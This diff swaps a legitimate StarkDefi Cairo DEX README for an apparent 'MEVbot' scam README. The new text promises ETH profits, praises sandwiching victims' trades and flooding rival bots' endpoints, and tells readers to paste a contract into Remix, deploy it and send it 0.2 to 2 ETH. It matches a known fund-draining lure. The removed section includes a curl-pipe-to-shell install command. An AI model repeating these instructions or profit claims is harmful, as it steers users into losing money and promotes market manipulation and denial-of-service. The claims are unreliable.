@@ -1,103 +1,91 @@
-# StarkDefi
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
-Welcome to the official contract repository for StarkDefi, a decentralized finance (DeFi) project built on the StarkNet network. This repository houses the source code for the smart contracts that power the StarkDefi platform.
 
-[![Run Test on PRs](https://github.com/Starkdefi/StarkDefi/actions/workflows/unit-test.yaml/badge.svg)](https://github.com/Starkdefi/StarkDefi/actions/workflows/unit-test.yaml)
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-## Repository Structure
+## For demonstration purposes, other wallets will be used for testing below.
 
-The repository is structured into several directories, each with a specific purpose:
 
-- [src](src/): This directory contains the Cairo source code for the StarkDefi contracts. The contracts are organized into modules such as [dex](src/dex.cairo) for decentralized exchange functionality, [token](src/token/erc20/erc20.cairo.cairo) for token-related contracts, and [utils](src/utils.cairo) for utility functions and contracts. The structure will evolve as the project expands.
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
-- [tests](src/tests/): This directory houses Cairo code for testing the StarkDefi contracts.
+## Update 08.05.2023 (Result)
 
-## Key Components (WIP)
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
-- [StarkDFactory](src/dex/v1/factory/factory.cairo): This factory contract is responsible for creating new trading pairs on the StarkDefi platform. You can find the factory contract's Interface [here](src/dex/v1/factory/interface.cairo).
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
-- [StarkDPair](src/dex/v1/pair/Pair.cairo): This contract represents a liquidity pool for a pair of tokens. You can find the pair contract's source code [here](src/dex/v1/pair/interface.cairo).
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-- [FeeVault](src/dex/v1/pair/FeesVault.cairo): This contract handles fees generated from the pair reserves. You can find it [here](src/dex/v1/pair/interface.cairo).
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-- [StarkDRouter](src/dex/v1/router/router.cairo): This contract provides functions for adding and removing liquidity, as well as swapping tokens. You can find the router contract's source code [here](src/dex/v1/router/interface.cairo).
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
 
-## Development
+Finally, the ETH is returned to the contract for withdrawal.
 
-Scarb, a build toolchain and package manager for Cairo and Starknet ecosystems, is used for building and testing the StarkDefi contracts.
+This bot performs all of these functions faster than 99% of other bots.
 
-A Dockerfile is provided for building the StarkDefi contracts. As of 6th Sept 2023, the Dockerfile uses Scarb v0.6.2. You can use the Dockerfile to build the StarkDefi contracts without installing Scarb on your local machine.
+*But ser, there are open source bots that do the same*
 
-To build the StarkDefi contracts using the Dockerfile, use the following command:
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
 
-```bash
-docker build -t starkdefi .
-```
+*Wen increase aggressiveness ?*
 
-To run the tests, use the following command:
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
 
-```bash
-docker run starkdefi test
-```
+*What did I learn?*
 
-You can access the Scarb CLI with the following command:
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
 
-```bash
-docker run starkdefi scarb <command>
-```
+*So why stop?*
 
-To install Scarb, follow the installation script provided in the Scarb documentation [1](https://docs.swmansion.com/scarb/download.html). Here is how you can install the latest stable release of Scarb:
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
 
-```bash
-curl --proto '=https' --tlsv1.2 -sSf https://docs.swmansion.com/scarb/install.sh | sh
-```
 
-This will install Scarb, the Cairo compiler, and the language server.
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
 
-To build the StarkDefi contracts, use the following command:
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
 
-```bash
-scarb build
-```
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
 
-## Testing
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
 
-GitHub Actions is used for continuous integration. The workflow is specified in the unit-test.yaml file and tests are run on every pull request.
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
 
-To run the tests directly, use the following command:
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
 
-```bash
-scarb test
-```
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
 
-You can filter the tests using the `--filter` flag. For example, to run only tests with `pair` in the test name, use the following command:
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
 
-```bash
-scarb test --filter pair
-```
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
 
-## Deployment
-
-StarkDefi uses [sncast](https://foundry-rs.github.io/starknet-foundry/starknet/index.html) to deploy the contracts. For more information on how to use sncast, visit the [sncast documentation](https://foundry-rs.github.io/starknet-foundry/starknet/index.html).
-
-The deployment sequence is as follows:
-
-- Declare the following contracts (order is not important):
-  - `StarkDFactory`
-  - `StarkDPair`
-  - `FeeVault`
-  - `StarkDRouter`
-
-- After declaring the contracts, deploy the following 2 contracts in this order:
-  - `StarkDFactory`
-  - `StarkDRouter`
-
-Note: Ensure to pass the correct arguments to both `StarkDFactory` and `StarkDRouter`. The `StarkDPair` and `FeeVault` contracts are deployed automatically whenever a new pair instance is created.
-
-## Contributing
-
-Contributions to the StarkDefi repository are welcome. Please read the [contributing guidelines](./CONTRIBUTING.md) before making a pull request.
-
-## License
-
-The StarkDefi contracts are released under the MIT License.
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
